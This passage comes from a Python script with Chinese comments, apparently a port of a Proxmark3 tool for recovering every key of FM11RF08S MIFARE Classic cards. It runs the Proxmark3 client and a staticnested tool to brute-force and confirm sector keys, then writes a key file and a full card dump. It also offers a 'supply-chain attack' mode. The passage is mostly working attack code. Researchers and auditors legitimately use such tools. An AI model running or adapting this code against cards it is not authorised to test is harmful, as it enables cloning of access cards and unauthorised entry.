            if debug:  # 如果启用调试模式
                print(cmd)  # 打印命令
            pm3 = subprocess.Popen(  # 启动Proxmark3进程
                f"{PROXMARK3_CLIENT_PATH}\\proxmark3.exe {port}",
                shell=True,
                stdout=subprocess.PIPE,
                stdin=subprocess.PIPE,
                stderr=subprocess.PIPE,
                env=env,
            )
            out, _ = pm3.communicate(cmd.encode())  # 执行暴力破解
            for line in out.decode("gbk").split("\n"):  # 遍历输出行
                if "aborted via keyboard" in line:  # 检测到键盘中断
                    abort = True  # 设置中断标志
                if "found:" in line:  # 找到了密钥
                    found_keys[sec][0] = line[30:].strip()  # 提取A密钥
                    found_keys[sec][1] = line[30:].strip()  # 提取B密钥（相同）
                    show_key(real_sec, 0, found_keys[sec][key_type])  # 显示A密钥
                    show_key(real_sec, 1, found_keys[sec][key_type])  # 显示B密钥
                if "found valid key" in line:  # 找到了密钥
                    found_keys[sec][0] = line[54:67].strip()  # 提取A密钥
                    found_keys[sec][1] = line[54:67].strip()  # 提取B密钥（相同）
                    show_key(real_sec, 0, found_keys[sec][key_type])  # 显示A密钥
                    show_key(real_sec, 1, found_keys[sec][key_type])  # 显示B密钥
        if abort:  # 如果中断
            break  # 跳出循环

        if ((found_keys[sec][0] == "") ^ (found_keys[sec][1] == "")) and nt[sec][  # 如果只有一个密钥未知，且随机数不同
            0
        ] != nt[sec][1]:
            if found_keys[sec][0] == "":  # 如果A密钥未知
                key_type_source = 1  # B密钥已知
                key_type_target = 0  # A密钥未知
            else:  # 否则
                key_type_source = 0  # A密钥已知
                key_type_target = 1  # B密钥未知
            if duplicates_dicts[sec][key_type_target]:  # 如果有重复密钥字典
                dic = f"keys_{uid:08x}_{real_sec:02}_{nt[sec][key_type_target]}_duplicates.dic"  # 字典文件
            elif filtered_dicts[sec][key_type_target]:  # 如果有过滤后的字典
                dic = f"keys_{uid:08x}_{real_sec:02}_{nt[sec][key_type_target]}_filtered.dic"  # 字典文件
            else:  # 否则
                dic = f"keys_{uid:08x}_{real_sec:02}_{nt[sec][key_type_target]}.dic"  # 字典文件
            cmd = [  # 构建staticnested_2x1nt1key命令
                tools["staticnested_2x1nt1key"],
                nt[sec][key_type_source],  # 已知密钥的随机数
                found_keys[sec][key_type_source],  # 已知密钥
                dic,  # 未知密钥的字典文件
            ]
            if debug:  # 如果启用调试模式
                print(" ".join(cmd))  # 打印命令
            result = subprocess.run(cmd, capture_output=True, text=True).stdout  # 运行命令
            keys = set()  # 存储匹配的密钥
            for line in result.split("\n"):  # 遍历输出行
                if "MATCH:" in line:  # 如果找到匹配
                    keys.add(line[12:])  # 添加密钥
            if len(keys) > 1:  # 多个匹配，需要进一步验证
                kt = ["a", "b"][key_type_target]  # 密钥类型
                cmd = f"hf mf fchk --blk {real_sec * 4} -{kt} --no-default"  # 构建暴力破解命令
                for k in keys:  # 遍历候选密钥
                    cmd += f" -k {k}"  # 添加每个候选密钥
                if debug:  # 如果启用调试模式
                    print(cmd)  # 打印命令
                pm3 = subprocess.Popen(  # 启动Proxmark3进程
                    f"{PROXMARK3_CLIENT_PATH}\\proxmark3.exe {port}",
                    shell=True,
                    stdout=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    env=env,
                )
                out, _ = pm3.communicate(cmd.encode())  # 执行暴力破解
                for line in out.decode("gbk").split("\n"):  # 遍历输出行
                    if "aborted via keyboard" in line:  # 检测到键盘中断
                        abort = True  # 设置中断标志
                    if "found:" in line:  # 找到了密钥
                        found_keys[sec][key_type_target] = line[30:].strip()  # 提取密钥
                    if "found valid key" in line:  # 找到了密钥
                        found_keys[sec][key_type_target] = line[54:67].strip()  # 提取密钥
            elif len(keys) == 1:  # 唯一匹配，直接使用
                found_keys[sec][key_type_target] = keys.pop()  # 设置密钥
            if found_keys[sec][key_type_target] != "":  # 如果找到了密钥
                show_key(real_sec, key_type_target, found_keys[sec][key_type_target])  # 显示密钥
        if abort:  # 如果中断
            break  # 跳出循环

    if abort:  # 如果中断
        show("按键盘任意键中止暴力破解阶段!")  # 显示中断消息
        final_check = False  # 取消最终检查

    plus = "[" + color("+", fg="green") + "] "  # 绿色加号前缀
    if final_check:  # 如果启用最终检查
        show("让 fchk 做最后一次转储, 只是为了确认和显示...")  # 显示最终检查消息
        keys_set = set([i for sl in found_keys for i in sl if i != ""])  # 收集所有找到的密钥
        with open(f"keys_{uid:08x}.dic", "w") as f:  # 将所有密钥写入字典文件
            for k in keys_set:  # 遍历密钥
                f.write(f"{k}\n")  # 写入密钥
        cmd = f"hf mf fchk -f keys_{uid:08x}.dic --no-default --dump"  # 构建最终验证命令
        if debug:  # 如果启用调试模式
            print(cmd)  # 打印命令
        pm3.stdin.write(cmd, capture=False, quiet=False)  # 发送命令
    else:  # 否则（不执行最终检查）
        show()  # 空行
        show(color("找到keys:", fg="green"), prompt=plus)  # 显示标题
        show(prompt=plus)  # 空行
        show("-----+-----+--------------+---+--------------+----", prompt=plus)  # 表格头部
        show(" Sec | Blk | key A        |res| key B        |res", prompt=plus)  # 表格头部
        show("-----+-----+--------------+---+--------------+----", prompt=plus)  # 表格头部
        for sec in range(NUM_SECTORS + NUM_EXTRA_SECTORS):  # 遍历所有扇区
            real_sec = sec  # 实际扇区号
            if sec >= NUM_SECTORS:  # 如果是额外扇区
                real_sec += 16  # 调整扇区号
            keys = [["", 0], ["", 0]]  # 存储密钥和验证状态
            for key_type in [0, 1]:  # 遍历A和B密钥
                if found_keys[sec][key_type] == "":  # 密钥未找到
                    keys[key_type] = [  # 红色占位符和失败标记
                        color("------------", fg="red"),
                        color("0", fg="red"),
                    ]
                else:  # 密钥已找到
                    keys[key_type] = [  # 绿色密钥和成功标记
                        color(found_keys[sec][key_type], fg="green"),
                        color("1", fg="green"),
                    ]
            show(  # 显示该扇区的行
                f" {real_sec:03} | {real_sec*4+3:03} | "
                + f"{keys[0][0]} | {keys[0][1]} | {keys[1][0]} | {keys[1][1]} ",
                prompt=plus,
            )
        show("-----+-----+--------------+---+--------------+----", prompt=plus)  # 表格底部
        show(  # 显示说明
            "( "
            + color("0", fg="red")
            + ":失败 / "
            + color("1", fg="green")
            + ":成功 )",
            prompt=plus,
        )
        show()  # 空行
        show("生成二进制密钥文件", prompt=plus)  # 显示生成二进制密钥文件的消息
        keyfile = f"{save_path}hf-mf-{uid:08X}-key.bin"  # 密钥文件名
        unknown = False  # 标记是否有未知密钥
        with open(keyfile, "wb") as f:  # 以二进制写入模式打开文件
            for sec in range(NUM_SECTORS + NUM_EXTRA_SECTORS):  # 遍历所有扇区
                #print(f"扇区 {sec}:")
                # 先获取当前扇区的A密钥
                key_a = found_keys[sec][0]  # A密钥
                #print(f"  A密钥: {key_a}")
                if key_a == "":  # 如果密钥未知
                    key_a = "FFFFFFFFFFFF"  # 使用默认未知密钥
                    unknown = True  # 标记有未知密钥
                f.write(bytes.fromhex(key_a))  # 写入A密钥

                # 再获取当前扇区的B密钥
                key_b = found_keys[sec][1]  # B密钥
                #print(f"  B密钥: {key_b}")
                if key_b == "":  # 如果密钥未知
                    key_b = "FFFFFFFFFFFF"  # 使用默认未知密钥
                    unknown = True  # 标记有未知密钥
                f.write(bytes.fromhex(key_b))  # 写入B密钥
        show(  # 显示密钥文件保存信息
            "已找到的密钥转储至 `" + color(keyfile, fg="yellow") + "`",
            prompt=plus,
        )
        if unknown:  # 如果有未知密钥
            show(  # 显示未知密钥提示
                "  --[ "
                + color("FFFFFFFFFFFF", fg="yellow")
                + " ]-- 已插入未知密钥",
                prompt="[" + color("=", fg="yellow") + "]",
            )
        show("正在生成最终转储文件", prompt=plus)  # 显示生成最终转储文件的消息
        dumpfile = f"{save_path}hf-mf-{uid:08X}-dump.bin"  # 转储文件名
        with open(dumpfile, "wb") as f:  # 以二进制写入模式打开文件
            for sec in range(NUM_SECTORS):  # 遍历所有扇区
                for b in range(4):  # 每个扇区有4个块
                    d = data[(sec * 4) + b]  # 获取数据块
                    if b == 3:  # 如果是扇区尾部块
                        ka = found_keys[sec][0]  # 获取A密钥
                        kb = found_keys[sec][1]  # 获取B密钥
                        if ka == "":  # 如果A密钥未知
                            ka = "FFFFFFFFFFFF"  # 使用默认未知密钥
                        if kb == "":  # 如果B密钥未知
                            kb = "FFFFFFFFFFFF"  # 使用默认未知密钥
                        d = ka + d[12:20] + kb  # 重构尾部块
                    f.write(bytes.fromhex(d))  # 写入数据块
        show(  # 显示转储文件保存信息
            "数据已转储至 `" + color(dumpfile, fg="yellow") + "`",
            prompt=plus,
        )

    if not keep:  # 如果不保留生成的字典文件
        show("正在移除生成的字典...", prompt=plus)  # 显示清理消息
        for sec in range(NUM_SECTORS + NUM_EXTRA_SECTORS):  # 遍历所有扇区
            real_sec = sec  # 实际扇区号
            if sec >= NUM_SECTORS:  # 如果是额外扇区
                real_sec += 16  # 调整扇区号
            for key_type in [0, 1]:  # 遍历A和B密钥
                for append in ["", "_filtered", "_duplicates"]:  # 遍历字典文件后缀
                    file_name = (  # 构建字典文件名
                        f"keys_{uid:08x}_{real_sec:02}_{nt[sec][key_type]}{append}.dic"
                    )
                    if os.path.isfile(file_name):  # 如果文件存在
                        os.remove(file_name)  # 删除文件

    elapsed_time3 = time.time() - start_time - elapsed_time1 - elapsed_time2  # 计算第三步耗时
    minutes = int(elapsed_time3 // 60)  # 计算分钟数
    seconds = int(elapsed_time3 % 60)  # 计算秒数
    show(  # 显示第三步耗时
        "----第三步耗时: "
        + color(f"{minutes:2}", fg="yellow")
        + " 分 "
        + color(f"{seconds:2}", fg="yellow")
        + " 秒 -----------"
    )

    elapsed_time = time.time() - start_time  # 计算总耗时
    minutes = int(elapsed_time // 60)  # 计算分钟数
    seconds = int(elapsed_time % 60)  # 计算秒数
    show(  # 显示总耗时
        "---- 总耗时: "
        + color(f"{minutes:2}", fg="yellow")
        + " 分 "
        + color(f"{seconds:2}", fg="yellow")
        + " 秒 -----------"
    )

    return {  # 返回结果
        "keyfile": keyfile,
        "found_keys": found_keys,
        "dumpfile": dumpfile,
        "data": data,
    }


def main():  # 主函数
    parser = argparse.ArgumentParser(  # 创建命令行参数解析器
        description="一个结合了 staticnested* 工具的脚本"
        "从 FM11RF08S 卡中恢复所有密钥."
    )
    parser.add_argument(  # 添加init-check参数
        "-x",
        "--init-check",
        action="store_true",
        help="对默认密钥运行初始 fchk 命令",
    )
    parser.add_argument(  # 添加final-check参数
        "-y",
        "--final-check",
        action="store_true",
        help="使用找到的密钥运行最终的 fchk 命令",
    )
    parser.add_argument(  # 添加keep参数
        "-k",
        "--keep",
        action="store_true",
        help="处理后保留生成的字典",
    )
    parser.add_argument(  # 添加debug参数
        "-d", "--debug", action="store_true", help="启用调试模式"
    )
    parser.add_argument(  # 添加supply-chain参数
        "-s",
        "--supply-chain",
        action="store_true",
        help="启用供应链攻击模式. " "查找 hf-mf-XXXXXXXX-default_nonces.json",
    )
    parser.add_argument(  # 添加port参数
        "-p",
        "--port",
        type=str,
        help="设置串口",
    )
    args = parser.parse_args()  # 解析命令行参数

    # 调用恢复函数
    recovery(  
        init_check=args.init_check,
        final_check=args.final_check,
        keep=args.keep,
        debug=args.debug,
        supply_chain=args.supply_chain,
        quiet=False,
        port=args.port,
    )


if __name__ == "__main__":  # 如果脚本作为主程序运行
    main()  # 调用主函数
